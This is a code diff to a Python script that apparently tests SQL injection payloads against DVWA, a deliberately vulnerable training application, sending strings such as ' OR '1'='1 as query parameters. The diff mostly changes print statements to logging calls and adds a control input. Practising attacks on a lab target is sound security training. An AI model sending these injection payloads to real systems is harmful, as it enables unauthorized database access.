@@ -1,7 +1,7 @@
-
+import logging
 import requests
 
-from dvwa.globals import DVWA_URL
+from dvwa.globals import DVWA_URL, DVWA_LOG_LEVEL
 from dvwa.utils import login_session
 
 
@@ -11,6 +11,7 @@ def main():
     session.cookies.set("security", "low")
     session = login_session(session)
     payloads = [
+        "this shouldn't work",
         "' OR '1'='1",
         "' OR '1'='1' -- ",
         "' OR 1=1#",
@@ -23,12 +24,12 @@ def main():
         response = requests.get(url, params=params, cookies=session.cookies.get_dict())
 
         if "Welcome" in response.text or "ID" in response.text:
-            print(f"[+] Successful payload: {payload}")
+            logging.info(f"Successful payload: {payload}")
         else:
-            print(f"[-] Payload failed: {payload}")
+            logging.info(f"Payload failed: {payload}")
 
 
 if __name__ == "__main__":
     import logging
-    logging.basicConfig(level=logging.DEBUG)
+    logging.basicConfig(level=DVWA_LOG_LEVEL)
     main()
